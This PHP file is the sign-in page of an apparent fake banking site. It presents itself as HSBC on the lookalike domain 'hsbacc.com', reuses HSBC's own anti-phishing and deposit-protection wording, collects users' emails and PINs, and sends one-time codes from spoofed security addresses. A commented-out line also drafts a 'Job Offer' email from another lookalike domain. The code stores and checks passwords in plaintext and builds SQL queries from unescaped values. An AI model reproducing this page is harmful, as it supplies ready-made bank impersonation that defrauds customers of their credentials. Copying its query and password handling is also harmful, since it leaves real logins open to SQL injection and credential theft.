<?php include 'includes/timeoutable.php' ?>
<?php include 'header.php'; ?>


<?php
       include 'includes/db.php';
?>

<?php
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) { //ALL CODE RUNS INSIDE THIS IF A USER IS LOGGED IN
    echo "<script type='text/javascript'> document.location = 'panel.php'; </script>";
    //  header('Location: panel.php');
} else { //IF NO USER LOGGED IN
}
?>

<div style=" height:100px;">
</div>
<div class="container">

    <?php //WHAT HAPPENS AFTER CLICKING SEND PASSWORD BEGINS
       // if(isset($_GET['code'])){
       /* if(($_GET['email'] AND $_GET['code'] AND $_GET['user'])){
            $date = date('Y-m-d H:i:s');
            $co = $_GET['code'];
            $em = $_GET['email'];
            $us = $_GET['user'];
                $sel_sql = "SELECT * From users WHERE code = '$co' AND username = '$us'";
                        $do_sql = mysqli_query($conn,$sel_sql);
                        if(mysqli_num_rows($do_sql) == 1){
         $ins_sql = "UPDATE users SET email='$em', updated_at='$date' WHERE code = '$co' and username = '$us'";
                                    $run_sql = mysqli_query($conn,$ins_sql);
                                    echo '<h4 style="color:green;" class="blinking text-center">User Account Registered Successfully! <a href="signin.php">Signin...</a></h4>';
                                         // header('Location: login.php');
        }else {
                            echo '<h4 style="color:red;" class="blinking text-center">Invalid Credentials!</h4>';
                        }
        }
         */
?>
    <?php
                  if(isset($_GET['success'])) {
                      if($_GET['success'] == 'password_changed') {
                          echo '<div class="alert alert-success text-center">
                        <strong>You have successfully modified your password!</strong> Please signin to continue.
                      </div>';
                      }
                  }
?>
    <?php
                      if(isset($_GET['invalidrefer'])) {
                          echo '<p style="color:orange;">Successfully registered</p>
                        <p>Referral link not activated because it is spam</p>
                     ';
                      }

//Blocked user
if(isset($_GET['suspended'])) {
    echo '<div class="alert text-center" style="color: black; background-color: #fdc600;">Your account has been <strong>suspended</strong> for violating our terms</p></div>
                   ';
}
?>
    <?php
                      if(isset($_GET['sent'])) {
                          echo '<div class="alert" style="color: black; background-color: #fdc600;">
  <strong>Application received!</strong> Thank you for choosing HSBC, we will review your application and respond within 0-2 business days.
</div>
                        
                     ';
                      }
?>

    <?php
if(isset($_POST['signin_submit'])) { //IF LOGIN BTN HAS BEEN CLICKED
    if(!empty($_POST['user_email']) && !empty($_POST['user_password'])) { //CHECK IF EMAIL AND PASSWORD IS EMPTY
        
        $get_user_email = mysqli_real_escape_string($conn, $_POST['user_email']);
        $get_password = mysqli_real_escape_string($conn, $_POST['user_password']);
        $sql = "SELECT * FROM users WHERE email = '$get_user_email' AND password = '$get_password'"; //FOR USERS
        if($result1 = mysqli_query($conn, $sql)) { //FOR USERS IF THERE IS CONNECTION TO THE DATABASE WHERE EMAIL AND PASSWORD IS AVAILABLE
            if(mysqli_num_rows($result1) > 0) { //IF NO. OF ROWS WITH ABOVE QUERY IS JUST ONE
                // $inno_sql = mysqli_query($conn,$sql);
               
                while($rows = mysqli_fetch_assoc($result1)) { //RETRIEVE INVENTOR DETAILS
                    if($rows['status'] == 'blocked') {
                        echo "<script type='text/javascript'> document.location = 'index.php?suspended'; </script>";
                        die();
                    }
                    $_SESSION['id'] = $rows['id'];
                    $_SESSION['email'] = $rows['email'];
                    $_SESSION['name'] = $rows['name'];
                }
                $digits = 5;
                $code = rand(pow(10, $digits-1), pow(10, $digits)-1);
                $_SESSION['code'] = $code;
                $sql2 = "SELECT * FROM otp WHERE userid = '$_SESSION[id]'"; //FOR USERS
                $result2 = mysqli_query($conn, $sql2); //FOR USERS IF THERE IS CONNECTION TO THE DATABASE WHERE EMAIL AND PASSWORD IS AVAILABLE
                if(mysqli_num_rows($result2) == 1) { //IF NO. OF ROWS WITH ABOVE QUERY IS JUST ONE
                    
                    $to = $email; // this is your Email address
                    $from = "otp@hsbacc.com"; // this is the sender's Email address
                    $first_name = $_SESSION['name'];
                    $subject2 = "OTP Verification | Do not share [OTP: ".$code."] ";
                    $headers  = 'MIME-Version: 1.0' . "\r\n";
                    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                    $message = '<html><body>';
                    //$message = '<div class="navbar-brand"  style="text-align: center;" href=""><img src="https://i.ibb.co/SXJ2prp/logo-icon-170012.png" alt="hsbacc" class="logo">';
                    ;
                    $message .= '<div>';
                    $message .= '<h3 style="text-align: left; font-weight: normal;">Hi '. $first_name . '</h3>';
                    $message .= "<h4 style='color:#071d49;'>Your one time password is</4>";
                    $message .= '<h1 style="color:#080;font-size:18px;"> '.$code.'</h1>';
                    $message .= '<p style="color: red;">NB: Please do not discose to anyone</p>';
                    $message .= '<p>we will never ask you to share this code with anyone</p>';
                    $message .= '<p>Don’t recognise this activity? quickly email us at security@hsbacc.com</p>';
                    $message .= '<div style="background-color: red; color: white;"><a href="https://www.hsbacc.com" style="color: white"><b>HSBACC!</b></a> More than just a bank. Get a little extra help from the <a href="https://www.hsbacc.com"><b>HSBACC</b></a>.</div>';
                    $message .= '</div></div></body></html>';
                    $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();
                    mail($to, $subject2, $message, $headers);
                    $upd_sql = "UPDATE otp SET code='$code' WHERE userid = '$_SESSION[id]'";
                    $run_sql = mysqli_query($conn, $upd_sql);
                } else {
                    $ins_sql1 = "INSERT INTO otp (name, userid, email, code) VALUES ('$_SESSION[name]', '$_SESSION[id]', '$email', '$code')";
                    $run_sql2 = mysqli_query($conn, $ins_sql1);
                    $to = $_SESSION['email']; // this is your Email address
                    $from = "security@hsbacc.com"; // this is the sender's Email address
                    $first_name = $_SESSION['name'];
                    $subject2 = "OTP Verification | Do not share [OTP: ".$code. "]";
                    $headers  = 'MIME-Version: 1.0' . "\r\n";
                    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                    $message = '<html><body>';
                    // $message = '<div class="navbar-brand"  style="text-align: center;" href=""><img src="https://i.ibb.co/pK6BfqV/CDFBank-Logo-Original-5000x5000-2-3.png" alt="hsbacc" class="logo">';
                    $message .= '<div>';
                    $message .= '<h3 style="text-align: left;">Hi '. $first_name . '</h3>';
                    $message .= "<h4 style='color:#071d49;'>Your one time password is
                </4>";
                    $message .= '<h1 style="color:#080;font-size:18px;"> '.$code.'</h1>';
                    $message .= '<p style="color: red;">NB: Please do not discose to anyone, We will never request for this code</p>';
                    $message .= '<p>we will never ask you to share this code with anyone</p>';
                    $message .= '<p>Don’t recognise this activity? quickly email us at security@hsbacc.com</p>';
                    $message .= '<div style="background-color: red; color: white;"><a href="https://www.hsbacc.com" style="color: white"><b>HSBACC!</b></a> More than just a bank. Get a little extra help from the <a href="https://www.hsbacc.com"><b>HSBACC</b></a>.</div>';
                    $message .= '</div></div></body></html>';
                    $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();
                    mail($to, $subject2, $message, $headers);
                }
                
                echo "<script type='text/javascript'> document.location = 'verifyotp.php'; </script>";
                //   header('Location: panel.php');
                    
            } else {
                echo "<script type='text/javascript'> document.location = 'index.php?login_error=wrong'; </script>";
                //  header('Location: index.php?login_error=wrong');
            } //
        } else {
            echo "<script type='text/javascript'> document.location = 'index.php?login_error=query_error'; </script>";
            // header('Location: signin.php?login_error=query_error');
        }
        
    } else {
        echo "<script type='text/javascript'> document.location = 'index.php?login_error=empty'; </script>";
        //   header('Location: signin.php?login_error=empty');
    }
} else {
    $login_err = '';

}
if(isset($_GET['login_error'])) { //TO OUTPUT LOGIN ERROR
    if($_GET['login_error'] == 'empty') {  //LOGIN ERROR FOR EMPTY
        $login_err = "<div class='alert alert-danger'>Email or password was empty!</div>";
    } elseif($_GET['login_error'] == 'wrong') { //LOGIN ERROR FOR INVALID DETAILS
        $login_err = "<div class='alert alert-danger'>Invalid email or password!</div>";
    } elseif($_GET['login_error'] == 'session') {
        $login_err = "<div class='alert alert-danger'>Session has expired, please sign in to continue</div>";
    }
}
echo $login_err;
?>

    <body class="homepage" style="background-color: #e8e8e8;">


        <!--LOGIN INTRO-->
        <!--FORM FOR LOGIN STARTS HERE-->

        <?php
                //$to = 'trustedward@gmail.com';

                //$subject = 'Job Offer';

                //$message = 'Would you be interested in working with us?';

                //$from = 'security@caixcreditos.com';

 

                //Sending email

                //if(mail($to, $subject, $message)) {

                //echo 'Your mail has been sent successfully.';

                //} else{

                //echo 'Unable to send email. Please try again.';

                //}

?>


        <div class="container form-div">
            <div class="row">
                <div class="col-xs-12-md-6" style="background-color: white; padding: 20px;">
                    <form role="form" class="register-form" method="POST" action="index.php" class="form-vertical"
                        enctype="multipart/form-data" role="form" name="myForm">
                        <h4 style="font-weight: 600; font-size: 22px; margin-bottom: 35px">
                            Log on to Online Banking</h4>
                        <div class="alert alert-info alert-dismissible" role="alert">
                            <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                <span aria-hidden="true" data-dismiss="alert">&times;</span>
                            </button>
                            <span></span>
                            <div style="color: black;">
                                <div
                                    style="position: relative;display:flex; align-items: center; gap: 40px; padding-left: 10px; padding-right: 10px">

                                    <i style="font-size:16px; position: absolute; top: 5px; left: 0px; "
                                        class="fa">&#xf06a;</i>
                                    <div
                                        style="display: flex; flex-direction: column; justify-content: space-between; gap: 20px; margin-left: 30px;">
                                        <p style="margin-bottom: 0px; font-size: 13px">Be aware of phishing
                                            SMS/emails/fraudulent websites.
                                            HSBC will never send SMS with a link requesting you to log on to your Online
                                            Banking.</p>

                                        <p style="margin-bottom: 0px; font-size: 13px">Money withdrawn from your insured
                                            deposit(s) is no longer protected by PIDM if transferred to a:</p>
                                        <ul style="list-style-type: lower-alpha; margin-left: 14px;">
                                            <li>deposit account held by a financial institution conducting Labuan
                                                banking business or Labuan Islamic banking business;</li>
                                            <li>deposit account held by a non-DTM; or</li>
                                            <li>non-deposit account (e.g. unit trust, securities trading account)</li>
                                        </ul>
                                    </div>
                                </div>

                            </div>

                        </div>
                        <div class="form-group">
                            <label>Please enter your email</label>
                            <input style="background-color: rgba(150, 0, 0, 0.1);; color: black; height: 45px;"
                                type="email" name="user_email" id="user_email" class="form-control input-md"
                                tabindex="4">
                        </div>
                        <div class="form-group">
                            <label>PIN</label>
                            <input style="background-color: rgba(150, 0, 0, 0.1);; color: black; height: 45px;"
                                type="password" name="user_password" class="form-control input-md" id="user_password">
                        </div>
                        <div class="" style="display: flex; align-items: center; gap: 8px;">
                            <input style="width: 20px; height:20px; margin-top: 0" class="form-check-input p-2"
                                type="checkbox" value="" id="myCheck">
                            <p class="mb-0" style="margin-bottom: 0; display: inline-block">Remember
                                me</p>
                        </div>
                        <hr class="colorgraph">

                        <div class="row">
                            <div class="" style="display: flex; align-items: center; gap: 10px; justify-content: end">
                                <div class="" style="margin-left: 15px"><button name="signin_submit" id="user_password"
                                        class="index-loginbtn">Continue</button>
                                </div>
                            </div>
                        </div>
                        <div class="row index-btn2">
                            <div class="col-lg-12 col-md-6"><input type="submit" name="signin_submit" value="Log on"
                                    id="user_password" class="btn btn-block btn-md" tabindex="7"
                                    style="background-color: rgba(210, 0, 0, 0.4); color: white; padding: 15px;"></div>
                        </div>
                    </form>
                    <div style="background-color: rgb(225, 232, 227); padding: 10px 20px; margin: 15px 0px">
                        <a href="./forgot-password.php">
                            <div style="display: flex; align-items: center; gap: 5px; color: black; font-size: 13px">

                                <p>Forgotten your password</p>

                                <p style="margin-bottom: 5px; font-weight: 400"><i
                                        style="font-size:20px; color: red; font-weight: bold;" class="fa">&#xf105;</i>
                                </p>

                            </div>
                        </a>
                        <a href="./forgot-password.php?security_device">
                            <div style="display: flex; align-items: center; gap: 4px; color: black; font-size: 13px;">

                                <p class="text-wrap">Continue with security device or mobile security key</p>

                                <p style="margin-bottom: 5px; font-weight: 400"><i
                                        style="font-size:20px; color: red; font-weight: bold;" class="fa">&#xf105;</i>
                                </p>

                            </div>
                        </a>
                    </div>

                </div>
                <img src="./images/images.jpeg" class="img-fluid" style="width: 100%; margin-top: 20px" />
            </div>
        </div>
</div>
<div style="height:50px;"></div>

<?php include 'footer.php'; ?>